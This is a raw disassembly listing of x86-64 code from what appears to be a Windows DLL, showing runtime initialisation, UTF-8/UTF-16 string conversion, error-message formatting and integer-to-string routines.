    696885a9:	e8 d6 c9 ff ff       	call   0x69684f84
    696885ae:	e8 c8 c9 ff ff       	call   0x69684f7b
    696885b3:	e8 ef f8 ff ff       	call   0x69687ea7
    696885b8:	90                   	nop
    696885b9:	48 83 c4 28          	add    $0x28,%rsp
    696885bd:	e9 82 9d ff ff       	jmp    0x69682344
    696885c2:	48 8d 05 b7 cd 0f 00 	lea    0xfcdb7(%rip),%rax        # 0x69785380
    696885c9:	c6 05 20 24 0f 00 16 	movb   $0x16,0xf2420(%rip)        # 0x6977a9f0
    696885d0:	48 89 05 81 c2 0f 00 	mov    %rax,0xfc281(%rip)        # 0x69784858
    696885d7:	48 8d 05 62 c2 0f 00 	lea    0xfc262(%rip),%rax        # 0x69784840
    696885de:	48 89 05 13 24 0f 00 	mov    %rax,0xf2413(%rip)        # 0x6977a9f8
    696885e5:	48 8d 05 10 93 ff ff 	lea    -0x6cf0(%rip),%rax        # 0x696818fc
    696885ec:	48 c7 05 49 c2 0f 00 	movq   $0x2,0xfc249(%rip)        # 0x69784840
    696885f3:	02 00 00 00 
    696885f7:	48 c7 05 46 c2 0f 00 	movq   $0x2,0xfc246(%rip)        # 0x69784848
    696885fe:	02 00 00 00 
    69688602:	66 c7 05 45 c2 0f 00 	movw   $0x331,0xfc245(%rip)        # 0x69784850
    69688609:	31 03 
    6968860b:	48 c7 05 ca 23 0f 00 	movq   $0x8,0xf23ca(%rip)        # 0x6977a9e0
    69688612:	08 00 00 00 
    69688616:	48 c7 05 c7 23 0f 00 	movq   $0x8,0xf23c7(%rip)        # 0x6977a9e8
    6968861d:	08 00 00 00 
    69688621:	48 89 05 e8 23 0f 00 	mov    %rax,0xf23e8(%rip)        # 0x6977aa10
    69688628:	c3                   	ret
    69688629:	48 83 ec 38          	sub    $0x38,%rsp
    6968862d:	48 8d 05 62 ff ff ff 	lea    -0x9e(%rip),%rax        # 0x69688596
    69688634:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688639:	e8 84 ff ff ff       	call   0x696885c2
    6968863e:	e8 c5 fe ff ff       	call   0x69688508
    69688643:	e8 aa b7 ff ff       	call   0x69683df2
    69688648:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    6968864d:	e8 62 fe ff ff       	call   0x696884b4
    69688652:	e8 7d fe ff ff       	call   0x696884d4
    69688657:	e8 fa c6 ff ff       	call   0x69684d56
    6968865c:	e8 16 c6 ff ff       	call   0x69684c77
    69688661:	e8 7c c4 ff ff       	call   0x69684ae2
    69688666:	e8 9d a2 ff ff       	call   0x69682908
    6968866b:	e8 57 a2 ff ff       	call   0x696828c7
    69688670:	e8 83 9f ff ff       	call   0x696825f8
    69688675:	e8 25 c4 ff ff       	call   0x69684a9f
    6968867a:	e8 dd c3 ff ff       	call   0x69684a5c
    6968867f:	e8 87 98 ff ff       	call   0x69681f0b
    69688684:	e8 74 94 ff ff       	call   0x69681afd
    69688689:	e8 af c1 ff ff       	call   0x6968483d
    6968868e:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69688693:	ff d0                	call   *%rax
    69688695:	90                   	nop
    69688696:	48 83 c4 38          	add    $0x38,%rsp
    6968869a:	c3                   	ret
    6968869b:	48 83 ec 38          	sub    $0x38,%rsp
    6968869f:	e8 85 ff ff ff       	call   0x69688629
    696886a4:	48 8d 05 02 29 00 00 	lea    0x2902(%rip),%rax        # 0x6968afad
    696886ab:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    696886b0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    696886b5:	e8 fa fd ff ff       	call   0x696884b4
    696886ba:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    696886bf:	ff d0                	call   *%rax
    696886c1:	90                   	nop
    696886c2:	48 83 c4 38          	add    $0x38,%rsp
    696886c6:	c3                   	ret
    696886c7:	48 83 ec 28          	sub    $0x28,%rsp
    696886cb:	83 fa 01             	cmp    $0x1,%edx
    696886ce:	75 07                	jne    0x696886d7
    696886d0:	e8 c6 ff ff ff       	call   0x6968869b
    696886d5:	eb 05                	jmp    0x696886dc
    696886d7:	83 fa 02             	cmp    $0x2,%edx
    696886da:	74 f4                	je     0x696886d0
    696886dc:	b8 01 00 00 00       	mov    $0x1,%eax
    696886e1:	48 83 c4 28          	add    $0x28,%rsp
    696886e5:	c3                   	ret
    696886e6:	41 54                	push   %r12
    696886e8:	55                   	push   %rbp
    696886e9:	57                   	push   %rdi
    696886ea:	56                   	push   %rsi
    696886eb:	53                   	push   %rbx
    696886ec:	48 83 ec 20          	sub    $0x20,%rsp
    696886f0:	48 89 d6             	mov    %rdx,%rsi
    696886f3:	48 89 cb             	mov    %rcx,%rbx
    696886f6:	48 8d 52 01          	lea    0x1(%rdx),%rdx
    696886fa:	48 8d 0d df 22 0f 00 	lea    0xf22df(%rip),%rcx        # 0x6977a9e0
    69688701:	48 01 d2             	add    %rdx,%rdx
    69688704:	e8 4e eb ff ff       	call   0x69687257
    69688709:	48 8d 7e fd          	lea    -0x3(%rsi),%rdi
    6968870d:	31 c9                	xor    %ecx,%ecx
    6968870f:	45 31 c0             	xor    %r8d,%r8d
    69688712:	4c 8d 56 ff          	lea    -0x1(%rsi),%r10
    69688716:	4c 8d 5e fe          	lea    -0x2(%rsi),%r11
    6968871a:	4f 8d 0c 00          	lea    (%r8,%r8,1),%r9
    6968871e:	48 39 f1             	cmp    %rsi,%rcx
    69688721:	4a 8d 2c 08          	lea    (%rax,%r9,1),%rbp
    69688725:	0f 8d 55 01 00 00    	jge    0x69688880
    6968872b:	44 8a 24 0b          	mov    (%rbx,%rcx,1),%r12b
    6968872f:	45 84 e4             	test   %r12b,%r12b
    69688732:	79 0d                	jns    0x69688741
    69688734:	44 89 e2             	mov    %r12d,%edx
    69688737:	c0 ea 05             	shr    $0x5,%dl
    6968873a:	80 fa 06             	cmp    $0x6,%dl
    6968873d:	75 0e                	jne    0x6968874d
    6968873f:	eb 19                	jmp    0x6968875a
    69688741:	49 0f be d4          	movsbq %r12b,%rdx
    69688745:	48 ff c1             	inc    %rcx
    69688748:	e9 1f 01 00 00       	jmp    0x6968886c
    6968874d:	44 89 e2             	mov    %r12d,%edx
    69688750:	c0 ea 04             	shr    $0x4,%dl
    69688753:	80 fa 0e             	cmp    $0xe,%dl
    69688756:	75 2b                	jne    0x69688783
    69688758:	eb 36                	jmp    0x69688790
    6968875a:	49 39 ca             	cmp    %rcx,%r10
    6968875d:	7e 6d                	jle    0x696887cc
    6968875f:	8a 54 0b 01          	mov    0x1(%rbx,%rcx,1),%dl
    69688763:	48 83 c1 02          	add    $0x2,%rcx
    69688767:	49 89 d1             	mov    %rdx,%r9
    6968876a:	4c 89 e2             	mov    %r12,%rdx
    6968876d:	48 c1 e2 06          	shl    $0x6,%rdx
    69688771:	41 83 e1 3f          	and    $0x3f,%r9d
    69688775:	81 e2 c0 07 00 00    	and    $0x7c0,%edx
    6968877b:	4c 09 ca             	or     %r9,%rdx
    6968877e:	e9 e9 00 00 00       	jmp    0x6968886c
    69688783:	44 89 e2             	mov    %r12d,%edx
    69688786:	c0 ea 03             	shr    $0x3,%dl
    69688789:	80 fa 1e             	cmp    $0x1e,%dl
    6968878c:	75 3e                	jne    0x696887cc
    6968878e:	eb 37                	jmp    0x696887c7
    69688790:	49 39 cb             	cmp    %rcx,%r11
    69688793:	7e 37                	jle    0x696887cc
    69688795:	8a 54 0b 02          	mov    0x2(%rbx,%rcx,1),%dl
    69688799:	49 c1 e4 0c          	shl    $0xc,%r12
    6968879d:	44 0f b6 4c 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r9d
    696887a3:	41 81 e4 00 f0 00 00 	and    $0xf000,%r12d
    696887aa:	48 83 c1 03          	add    $0x3,%rcx
    696887ae:	83 e2 3f             	and    $0x3f,%edx
    696887b1:	49 c1 e1 06          	shl    $0x6,%r9
    696887b5:	4c 09 e2             	or     %r12,%rdx
    696887b8:	41 81 e1 c0 0f 00 00 	and    $0xfc0,%r9d
    696887bf:	4c 09 ca             	or     %r9,%rdx
    696887c2:	e9 93 00 00 00       	jmp    0x6968885a
    696887c7:	48 39 cf             	cmp    %rcx,%rdi
    696887ca:	7f 0d                	jg     0x696887d9
    696887cc:	48 ff c1             	inc    %rcx
    696887cf:	ba fd ff 00 00       	mov    $0xfffd,%edx
    696887d4:	e9 93 00 00 00       	jmp    0x6968886c
    696887d9:	8a 54 0b 03          	mov    0x3(%rbx,%rcx,1),%dl
    696887dd:	49 c1 e4 12          	shl    $0x12,%r12
    696887e1:	41 81 e4 00 00 1c 00 	and    $0x1c0000,%r12d
    696887e8:	83 e2 3f             	and    $0x3f,%edx
    696887eb:	4c 09 e2             	or     %r12,%rdx
    696887ee:	44 0f b6 64 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r12d
    696887f4:	49 c1 e4 0c          	shl    $0xc,%r12
    696887f8:	41 81 e4 00 f0 03 00 	and    $0x3f000,%r12d
    696887ff:	4c 09 e2             	or     %r12,%rdx
    69688802:	44 0f b6 64 0b 02    	movzbl 0x2(%rbx,%rcx,1),%r12d
    69688808:	48 83 c1 04          	add    $0x4,%rcx
    6968880c:	49 c1 e4 06          	shl    $0x6,%r12
    69688810:	41 81 e4 c0 0f 00 00 	and    $0xfc0,%r12d
    69688817:	4c 09 e2             	or     %r12,%rdx
    6968881a:	48 81 fa ff ff 00 00 	cmp    $0xffff,%rdx
    69688821:	7e 37                	jle    0x6968885a
    69688823:	48 81 fa ff ff 10 00 	cmp    $0x10ffff,%rdx
    6968882a:	7f 46                	jg     0x69688872
    6968882c:	48 81 ea 00 00 01 00 	sub    $0x10000,%rdx
    69688833:	49 ff c0             	inc    %r8
    69688836:	49 89 d4             	mov    %rdx,%r12
    69688839:	66 81 e2 ff 03       	and    $0x3ff,%dx
    6968883e:	49 c1 fc 0a          	sar    $0xa,%r12
    69688842:	66 81 ea 00 24       	sub    $0x2400,%dx
    69688847:	66 41 81 ec 00 28    	sub    $0x2800,%r12w
    6968884d:	66 44 89 65 00       	mov    %r12w,0x0(%rbp)
    69688852:	66 42 89 54 08 02    	mov    %dx,0x2(%rax,%r9,1)
    69688858:	eb 1e                	jmp    0x69688878
    6968885a:	48 81 fa ff d7 00 00 	cmp    $0xd7ff,%rdx
    69688861:	7e 09                	jle    0x6968886c
    69688863:	48 81 fa ff df 00 00 	cmp    $0xdfff,%rdx
    6968886a:	7e 06                	jle    0x69688872
    6968886c:	66 89 55 00          	mov    %dx,0x0(%rbp)
    69688870:	eb 06                	jmp    0x69688878
    69688872:	66 c7 45 00 fd ff    	movw   $0xfffd,0x0(%rbp)
    69688878:	49 ff c0             	inc    %r8
    6968887b:	e9 9a fe ff ff       	jmp    0x6968871a
    69688880:	66 c7 45 00 00 00    	movw   $0x0,0x0(%rbp)
    69688886:	48 83 c4 20          	add    $0x20,%rsp
    6968888a:	5b                   	pop    %rbx
    6968888b:	5e                   	pop    %rsi
    6968888c:	5f                   	pop    %rdi
    6968888d:	5d                   	pop    %rbp
    6968888e:	41 5c                	pop    %r12
    69688890:	c3                   	ret
    69688891:	57                   	push   %rdi
    69688892:	48 85 c9             	test   %rcx,%rcx
    69688895:	49 89 c8             	mov    %rcx,%r8
    69688898:	74 1e                	je     0x696888b8
    6968889a:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6968889e:	31 c0                	xor    %eax,%eax
    696888a0:	4c 89 c7             	mov    %r8,%rdi
    696888a3:	f2 ae                	repnz scas (%rdi),%al
    696888a5:	48 89 ca             	mov    %rcx,%rdx
    696888a8:	4c 89 c1             	mov    %r8,%rcx
    696888ab:	48 f7 d2             	not    %rdx
    696888ae:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    696888b2:	5f                   	pop    %rdi
    696888b3:	e9 2e fe ff ff       	jmp    0x696886e6
    696888b8:	31 c0                	xor    %eax,%eax
    696888ba:	5f                   	pop    %rdi
    696888bb:	c3                   	ret
    696888bc:	48 83 ec 28          	sub    $0x28,%rsp
    696888c0:	31 d2                	xor    %edx,%edx
    696888c2:	48 85 c9             	test   %rcx,%rcx
    696888c5:	74 03                	je     0x696888ca
    696888c7:	48 8b 11             	mov    (%rcx),%rdx
    696888ca:	e8 2f 90 ff ff       	call   0x696818fe
    696888cf:	48 89 c1             	mov    %rax,%rcx
    696888d2:	48 83 c4 28          	add    $0x28,%rsp
    696888d6:	e9 0b fe ff ff       	jmp    0x696886e6
    696888db:	41 55                	push   %r13
    696888dd:	41 54                	push   %r12
    696888df:	55                   	push   %rbp
    696888e0:	57                   	push   %rdi
    696888e1:	56                   	push   %rsi
    696888e2:	53                   	push   %rbx
    696888e3:	48 83 ec 28          	sub    $0x28,%rsp
    696888e7:	41 bc ef ff ff ff    	mov    $0xffffffef,%r12d
    696888ed:	41 bd bf ff ff ff    	mov    $0xffffffbf,%r13d
    696888f3:	48 89 cf             	mov    %rcx,%rdi
    696888f6:	48 89 d1             	mov    %rdx,%rcx
    696888f9:	4c 89 c5             	mov    %r8,%rbp
    696888fc:	48 c1 f9 02          	sar    $0x2,%rcx
    69688900:	48 01 d1             	add    %rdx,%rcx
    69688903:	e8 23 ec ff ff       	call   0x6968752b
    69688908:	45 31 c0             	xor    %r8d,%r8d
    6968890b:	4b 8d 14 00          	lea    (%r8,%r8,1),%rdx
    6968890f:	66 8b 0c 17          	mov    (%rdi,%rdx,1),%cx
    69688913:	66 85 c9             	test   %cx,%cx
    69688916:	0f 84 36 01 00 00    	je     0x69688a52
    6968891c:	44 8d 89 00 28 00 00 	lea    0x2800(%rcx),%r9d
    69688923:	49 8d 70 01          	lea    0x1(%r8),%rsi
    69688927:	66 41 81 f9 ff 03    	cmp    $0x3ff,%r9w
    6968892d:	77 1e                	ja     0x6968894d
    6968892f:	44 0f b7 4c 17 02    	movzwl 0x2(%rdi,%rdx,1),%r9d
    69688935:	66 41 81 f9 ff db    	cmp    $0xdbff,%r9w
    6968893b:	4c 89 ca             	mov    %r9,%rdx
    6968893e:	77 22                	ja     0x69688962
    69688940:	49 81 f9 ff db 00 00 	cmp    $0xdbff,%r9
    69688947:	41 0f 9f c1          	setg   %r9b
    6968894b:	eb 20                	jmp    0x6968896d
    6968894d:	8d 91 00 24 00 00    	lea    0x2400(%rcx),%edx
    69688953:	48 89 eb             	mov    %rbp,%rbx
    69688956:	66 81 fa ff 03       	cmp    $0x3ff,%dx
    6968895b:	76 3b                	jbe    0x69688998
    6968895d:	0f b7 d9             	movzwl %cx,%ebx
    69688960:	eb 36                	jmp    0x69688998
    69688962:	49 81 f9 ff df 00 00 	cmp    $0xdfff,%r9
    69688969:	41 0f 9e c1          	setle  %r9b
    6968896d:	45 84 c9             	test   %r9b,%r9b
    69688970:	74 23                	je     0x69688995
    69688972:	49 8d 70 02          	lea    0x2(%r8),%rsi
    69688976:	48 89 cb             	mov    %rcx,%rbx
    69688979:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
    6968897f:	48 c1 e3 0a          	shl    $0xa,%rbx
    69688983:	81 e3 00 fc 0f 00    	and    $0xffc00,%ebx
    69688989:	48 09 d3             	or     %rdx,%rbx
    6968898c:	48 81 c3 00 00 01 00 	add    $0x10000,%rbx
    69688993:	eb 5f                	jmp    0x696889f4
    69688995:	48 89 eb             	mov    %rbp,%rbx
    69688998:	48 83 fb 7f          	cmp    $0x7f,%rbx
    6968899c:	0f 8e 9d 00 00 00    	jle    0x69688a3f
    696889a2:	48 81 fb ff 07 00 00 	cmp    $0x7ff,%rbx
    696889a9:	7e 0b                	jle    0x696889b6
    696889ab:	48 81 fb ff ff 00 00 	cmp    $0xffff,%rbx
    696889b2:	7f 0e                	jg     0x696889c2
    696889b4:	eb 32                	jmp    0x696889e8
    696889b6:	48 89 da             	mov    %rbx,%rdx
    696889b9:	48 c1 fa 06          	sar    $0x6,%rdx
    696889bd:	83 ca c0             	or     $0xffffffc0,%edx
    696889c0:	eb 6c                	jmp    0x69688a2e
    696889c2:	48 81 fb ff ff 10 00 	cmp    $0x10ffff,%rbx
    696889c9:	7e 29                	jle    0x696889f4
    696889cb:	44 89 e2             	mov    %r12d,%edx
    696889ce:	48 89 c1             	mov    %rax,%rcx
    696889d1:	e8 9c f6 ff ff       	call   0x69688072
    696889d6:	44 89 ea             	mov    %r13d,%edx
    696889d9:	48 89 c1             	mov    %rax,%rcx
    696889dc:	e8 91 f6 ff ff       	call   0x69688072
    696889e1:	ba bd ff ff ff       	mov    $0xffffffbd,%edx
    696889e6:	eb 5a                	jmp    0x69688a42
    696889e8:	48 89 da             	mov    %rbx,%rdx
    696889eb:	48 c1 fa 0c          	sar    $0xc,%rdx
    696889ef:	83 ca e0             	or     $0xffffffe0,%edx
    696889f2:	eb 22                	jmp    0x69688a16
    696889f4:	48 89 da             	mov    %rbx,%rdx
    696889f7:	48 89 c1             	mov    %rax,%rcx
    696889fa:	48 c1 fa 12          	sar    $0x12,%rdx
    696889fe:	83 ca f0             	or     $0xfffffff0,%edx
    69688a01:	0f be d2             	movsbl %dl,%edx
    69688a04:	e8 69 f6 ff ff       	call   0x69688072
    69688a09:	48 89 da             	mov    %rbx,%rdx
    69688a0c:	48 c1 fa 0c          	sar    $0xc,%rdx
    69688a10:	83 e2 3f             	and    $0x3f,%edx
    69688a13:	83 ca 80             	or     $0xffffff80,%edx
    69688a16:	0f be d2             	movsbl %dl,%edx
    69688a19:	48 89 c1             	mov    %rax,%rcx
    69688a1c:	e8 51 f6 ff ff       	call   0x69688072
    69688a21:	48 89 da             	mov    %rbx,%rdx
    69688a24:	48 c1 fa 06          	sar    $0x6,%rdx
    69688a28:	83 e2 3f             	and    $0x3f,%edx
    69688a2b:	83 ca 80             	or     $0xffffff80,%edx
    69688a2e:	0f be d2             	movsbl %dl,%edx
    69688a31:	48 89 c1             	mov    %rax,%rcx
    69688a34:	83 e3 3f             	and    $0x3f,%ebx
    69688a37:	e8 36 f6 ff ff       	call   0x69688072
    69688a3c:	83 cb 80             	or     $0xffffff80,%ebx
    69688a3f:	0f be d3             	movsbl %bl,%edx
    69688a42:	48 89 c1             	mov    %rax,%rcx
    69688a45:	e8 28 f6 ff ff       	call   0x69688072
    69688a4a:	49 89 f0             	mov    %rsi,%r8
    69688a4d:	e9 b9 fe ff ff       	jmp    0x6968890b
    69688a52:	48 83 c4 28          	add    $0x28,%rsp
    69688a56:	5b                   	pop    %rbx
    69688a57:	5e                   	pop    %rsi
    69688a58:	5f                   	pop    %rdi
    69688a59:	5d                   	pop    %rbp
    69688a5a:	41 5c                	pop    %r12
    69688a5c:	41 5d                	pop    %r13
    69688a5e:	c3                   	ret
    69688a5f:	41 b8 fd ff 00 00    	mov    $0xfffd,%r8d
    69688a65:	ba 50 00 00 00       	mov    $0x50,%edx
    69688a6a:	e9 6c fe ff ff       	jmp    0x696888db
    69688a6f:	53                   	push   %rbx
    69688a70:	48 83 ec 50          	sub    $0x50,%rsp
    69688a74:	31 db                	xor    %ebx,%ebx
    69688a76:	85 c9                	test   %ecx,%ecx
    69688a78:	41 89 c8             	mov    %ecx,%r8d
    69688a7b:	74 57                	je     0x69688ad4
    69688a7d:	45 31 c9             	xor    %r9d,%r9d
    69688a80:	31 d2                	xor    %edx,%edx
    69688a82:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
    69688a89:	00 
    69688a8a:	31 db                	xor    %ebx,%ebx
    69688a8c:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
    69688a91:	b9 00 13 00 00       	mov    $0x1300,%ecx
    69688a96:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    69688a9d:	00 00 
    69688a9f:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    69688aa6:	00 00 
    69688aa8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69688aad:	ff 15 b5 3b 10 00    	call   *0x103bb5(%rip)        # 0x6978c668
    69688ab3:	85 c0                	test   %eax,%eax
    69688ab5:	74 1d                	je     0x69688ad4
    69688ab7:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    69688abc:	e8 9e ff ff ff       	call   0x69688a5f
    69688ac1:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    69688ac6:	48 89 c3             	mov    %rax,%rbx
    69688ac9:	48 85 c9             	test   %rcx,%rcx
    69688acc:	74 06                	je     0x69688ad4
    69688ace:	ff 15 34 be 0f 00    	call   *0xfbe34(%rip)        # 0x69784908
    69688ad4:	48 89 d8             	mov    %rbx,%rax
    69688ad7:	48 83 c4 50          	add    $0x50,%rsp
    69688adb:	5b                   	pop    %rbx
    69688adc:	c3                   	ret
    69688add:	57                   	push   %rdi
    69688ade:	56                   	push   %rsi
    69688adf:	53                   	push   %rbx
    69688ae0:	48 83 ec 20          	sub    $0x20,%rsp
    69688ae4:	89 cf                	mov    %ecx,%edi
    69688ae6:	48 89 d6             	mov    %rdx,%rsi
    69688ae9:	ba 38 00 00 00       	mov    $0x38,%edx
    69688aee:	48 8d 0d 0b 3d 10 00 	lea    0x103d0b(%rip),%rcx        # 0x6978c800
    69688af5:	e8 5d e7 ff ff       	call   0x69687257
    69688afa:	89 f9                	mov    %edi,%ecx
    69688afc:	48 89 c3             	mov    %rax,%rbx
    69688aff:	48 8d 05 5a c9 0f 00 	lea    0xfc95a(%rip),%rax        # 0x69785460
    69688b06:	89 7b 30             	mov    %edi,0x30(%rbx)
    69688b09:	48 89 03             	mov    %rax,(%rbx)
    69688b0c:	48 8d 05 78 59 00 00 	lea    0x5978(%rip),%rax        # 0x6968e48b
    69688b13:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69688b17:	48 8d 7b 18          	lea    0x18(%rbx),%rdi
    69688b1b:	e8 4f ff ff ff       	call   0x69688a6f
    69688b20:	48 89 f9             	mov    %rdi,%rcx
    69688b23:	48 89 c2             	mov    %rax,%rdx
    69688b26:	e8 70 d8 ff ff       	call   0x6968639b
    69688b2b:	48 85 f6             	test   %rsi,%rsi
    69688b2e:	74 7f                	je     0x69688baf
    69688b30:	48 83 3e 00          	cmpq   $0x0,(%rsi)
    69688b34:	7e 79                	jle    0x69688baf
    69688b36:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69688b3a:	48 85 c9             	test   %rcx,%rcx
    69688b3d:	74 24                	je     0x69688b63
    69688b3f:	48 8b 01             	mov    (%rcx),%rax
    69688b42:	48 85 c0             	test   %rax,%rax
    69688b45:	7e 1c                	jle    0x69688b63
    69688b47:	80 7c 01 0f 0a       	cmpb   $0xa,0xf(%rcx,%rax,1)
    69688b4c:	74 15                	je     0x69688b63
    69688b4e:	ba 0a 00 00 00       	mov    $0xa,%edx
    69688b53:	e8 1a f5 ff ff       	call   0x69688072
    69688b58:	48 89 f9             	mov    %rdi,%rcx
    69688b5b:	48 89 c2             	mov    %rax,%rdx
    69688b5e:	e8 38 d8 ff ff       	call   0x6968639b
    69688b63:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69688b67:	ba 11 00 00 00       	mov    $0x11,%edx
    69688b6c:	e8 f2 ec ff ff       	call   0x69687863
    69688b71:	48 89 f9             	mov    %rdi,%rcx
    69688b74:	48 89 c2             	mov    %rax,%rdx
    69688b77:	e8 1f d8 ff ff       	call   0x6968639b
    69688b7c:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69688b80:	48 8d 15 59 60 00 00 	lea    0x6059(%rip),%rdx        # 0x6968ebe0
    69688b87:	e8 ec 8d ff ff       	call   0x69681978
    69688b8c:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69688b90:	48 8b 16             	mov    (%rsi),%rdx
    69688b93:	e8 cb ec ff ff       	call   0x69687863
    69688b98:	48 89 f9             	mov    %rdi,%rcx
    69688b9b:	48 89 c2             	mov    %rax,%rdx
    69688b9e:	e8 f8 d7 ff ff       	call   0x6968639b
    69688ba3:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69688ba7:	48 89 f2             	mov    %rsi,%rdx
    69688baa:	e8 ef 8d ff ff       	call   0x6968199e
    69688baf:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    69688bb3:	48 85 f6             	test   %rsi,%rsi
    69688bb6:	74 06                	je     0x69688bbe
    69688bb8:	48 83 3e 00          	cmpq   $0x0,(%rsi)
    69688bbc:	75 1d                	jne    0x69688bdb
    69688bbe:	48 8d 0d db 5f 00 00 	lea    0x5fdb(%rip),%rcx        # 0x6968eba0
    69688bc5:	e8 11 e5 ff ff       	call   0x696870db
    69688bca:	48 85 f6             	test   %rsi,%rsi
    69688bcd:	48 89 43 18          	mov    %rax,0x18(%rbx)
    69688bd1:	74 08                	je     0x69688bdb
    69688bd3:	48 89 f1             	mov    %rsi,%rcx
    69688bd6:	e8 0a d8 ff ff       	call   0x696863e5
    69688bdb:	48 89 d8             	mov    %rbx,%rax
    69688bde:	48 83 c4 20          	add    $0x20,%rsp
    69688be2:	5b                   	pop    %rbx
    69688be3:	5e                   	pop    %rsi
    69688be4:	5f                   	pop    %rdi
    69688be5:	c3                   	ret
    69688be6:	0f b7 c1             	movzwl %cx,%eax
    69688be9:	c3                   	ret
    69688bea:	57                   	push   %rdi
    69688beb:	56                   	push   %rsi
    69688bec:	53                   	push   %rbx
    69688bed:	48 83 ec 20          	sub    $0x20,%rsp
    69688bf1:	48 85 d2             	test   %rdx,%rdx
    69688bf4:	48 89 cb             	mov    %rcx,%rbx
    69688bf7:	48 89 d6             	mov    %rdx,%rsi
    69688bfa:	79 3a                	jns    0x69688c36
    69688bfc:	b8 01 00 00 00       	mov    $0x1,%eax
    69688c01:	48 c1 e0 3f          	shl    $0x3f,%rax
    69688c05:	48 39 c2             	cmp    %rax,%rdx
    69688c08:	74 03                	je     0x69688c0d
    69688c0a:	48 f7 de             	neg    %rsi
    69688c0d:	48 8b 0b             	mov    (%rbx),%rcx
    69688c10:	31 ff                	xor    %edi,%edi
    69688c12:	48 85 c9             	test   %rcx,%rcx
    69688c15:	74 03                	je     0x69688c1a
    69688c17:	48 8b 39             	mov    (%rcx),%rdi
    69688c1a:	48 8d 57 01          	lea    0x1(%rdi),%rdx
    69688c1e:	e8 ed f2 ff ff       	call   0x69687f10
    69688c23:	48 89 d9             	mov    %rbx,%rcx
    69688c26:	48 89 c2             	mov    %rax,%rdx
    69688c29:	e8 f7 d7 ff ff       	call   0x69686425
    69688c2e:	48 8b 03             	mov    (%rbx),%rax
    69688c31:	c6 44 38 10 2d       	movb   $0x2d,0x10(%rax,%rdi,1)
    69688c36:	48 89 f2             	mov    %rsi,%rdx
    69688c39:	48 89 d9             	mov    %rbx,%rcx
    69688c3c:	48 83 c4 20          	add    $0x20,%rsp
    69688c40:	5b                   	pop    %rbx
    69688c41:	5e                   	pop    %rsi
    69688c42:	5f                   	pop    %rdi
    69688c43:	e9 70 f3 ff ff       	jmp    0x69687fb8
    69688c48:	41 57                	push   %r15
    69688c4a:	41 56                	push   %r14
    69688c4c:	41 55                	push   %r13
    69688c4e:	41 54                	push   %r12
    69688c50:	55                   	push   %rbp
    69688c51:	57                   	push   %rdi
    69688c52:	56                   	push   %rsi
    69688c53:	53                   	push   %rbx
    69688c54:	48 83 ec 38          	sub    $0x38,%rsp
    69688c58:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    69688c5f:	00 00 
    69688c61:	48 89 cb             	mov    %rcx,%rbx
    69688c64:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
    69688c69:	e8 bd e8 ff ff       	call   0x6968752b
    69688c6e:	48 85 db             	test   %rbx,%rbx
    69688c71:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688c76:	0f 84 5c 01 00 00    	je     0x69688dd8
    69688c7c:	4c 8b 23             	mov    (%rbx),%r12
    69688c7f:	31 ff                	xor    %edi,%edi
    69688c81:	48 83 c3 10          	add    $0x10,%rbx
    69688c85:	41 bd 19 00 00 00    	mov    $0x19,%r13d
    69688c8b:	48 8d 6c 24 28       	lea    0x28(%rsp),%rbp
    69688c90:	41 be 01 00 00 00    	mov    $0x1,%r14d
    69688c96:	4c 39 e7             	cmp    %r12,%rdi
    69688c99:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69688c9e:	0f 8d 34 01 00 00    	jge    0x69688dd8
    69688ca4:	48 8b 43 08          	mov    0x8(%rbx),%rax
    69688ca8:	48 83 f8 f6          	cmp    $0xfffffffffffffff6,%rax
    69688cac:	74 08                	je     0x69688cb6
    69688cae:	48 83 f8 9c          	cmp    $0xffffffffffffff9c,%rax
    69688cb2:	75 1d                	jne    0x69688cd1
    69688cb4:	eb 27                	jmp    0x69688cdd
    69688cb6:	ba 11 00 00 00       	mov    $0x11,%edx
    69688cbb:	e8 a3 eb ff ff       	call   0x69687863
    69688cc0:	48 8d 15 f9 5c 00 00 	lea    0x5cf9(%rip),%rdx        # 0x6968e9c0
    69688cc7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688ccc:	e9 f3 00 00 00       	jmp    0x69688dc4
    69688cd1:	31 f6                	xor    %esi,%esi
    69688cd3:	48 85 c9             	test   %rcx,%rcx
    69688cd6:	74 20                	je     0x69688cf8
    69688cd8:	48 8b 31             	mov    (%rcx),%rsi
    69688cdb:	eb 1b                	jmp    0x69688cf8
    69688cdd:	ba 03 00 00 00       	mov    $0x3,%edx
    69688ce2:	e8 7c eb ff ff       	call   0x69687863
    69688ce7:	48 8d 15 a2 5c 00 00 	lea    0x5ca2(%rip),%rdx        # 0x6968e990
    69688cee:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69688cf3:	e9 cc 00 00 00       	jmp    0x69688dc4
    69688cf8:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    69688cfc:	48 89 e9             	mov    %rbp,%rcx
